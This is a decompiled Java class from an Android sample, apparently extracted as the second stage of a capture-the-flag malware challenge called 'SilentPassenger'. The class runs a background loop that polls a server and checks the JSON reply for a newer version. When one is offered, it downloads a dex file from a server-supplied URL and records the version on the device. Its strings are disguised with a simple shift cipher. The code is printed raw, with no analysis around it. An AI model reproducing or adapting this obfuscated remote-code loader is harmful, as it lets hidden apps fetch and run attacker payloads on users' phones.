package com.c.j;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import org.json.JSONObject;

/* JADX INFO: Access modifiers changed from: package-private */
/* loaded from: D:\hommie_Ctf\SilentPassenger\extracted\stage2_unzip\classes_fixed.dex */
public final class b implements Runnable {
    final /* synthetic */ Context a;
    final /* synthetic */ String b;
    final /* synthetic */ qbh c;

    /* JADX INFO: Access modifiers changed from: package-private */
    public b(qbh qbhVar, Context context, String str) {
        this.c = qbhVar;
        this.a = context;
        this.b = str;
    }

    @Override // java.lang.Runnable
    public final void run() {
        try {
            g.a().b();
            int i = 5;
            while (true) {
                int i2 = i - 1;
                if (i <= 0 || g.a().c()) {
                    break;
                }
                t.a();
                Context context = this.a;
                String str = this.b;
                try {
                    String b = m.b(context);
                    String a = m.a(context, str);
                    String str2 = null;
                    for (int i3 = 0; i3 < 5; i3++) {
                        str2 = r.a(m.a(context), a);
                        if (!TextUtils.isEmpty(str2)) {
                            break;
                        }
                    }
                    if (!TextUtils.isEmpty(str2)) {
                        JSONObject jSONObject = new JSONObject(str2);
                        if (jSONObject.optString(a.a("htij", 5)).equals(a.a("755", 5)) && jSONObject.optJSONObject(a.a("hexe", 4)).optInt(a.a("xyfyzx", 5)) == 0 && Float.parseFloat(jSONObject.optJSONObject(a.a("nk~k", 10)).optString(a.a("hi|Zivwmsr", 4))) > Float.parseFloat(m.c(context))) {
                            Log.i(a.a("}nu", 10), a.a("gh{#xsgdwh", 3));
                            if (t.a(jSONObject.optJSONObject(a.a("kh{h", 7)).optString(a.a("gh{Xuo", 3)), b)) {
                                g.a = false;
                                File file = new File(b, m.d);
                                if (file.exists()) {
                                    file.delete();
                                }
                                file.createNewFile();
                                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file)));
                                bufferedWriter.write(jSONObject.optJSONObject(a.a("ifyf", 5)).optString(a.a("fgzXgtukqp", 2)));
                                bufferedWriter.flush();
                                bufferedWriter.close();
                            }
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    j.a().obtainMessage().sendToTarget();
                }
                g.a().b();
                for (int i4 = 0; i4 < 5 && !g.a().c(); i4++) {
                    try {
                        Thread.sleep(60000L);
                    } catch (InterruptedException e2) {
                        Thread.currentThread().interrupt();
                        synchronized (this.c) {
                            this.c.initLoopRunning = false;
                            return;
                        }
                    }
                }
                i = i2;
            }
            synchronized (this.c) {
                this.c.initLoopRunning = false;
            }
        } catch (Throwable th) {
            synchronized (this.c) {
                this.c.initLoopRunning = false;
                throw th;
            }
        }
    }
}
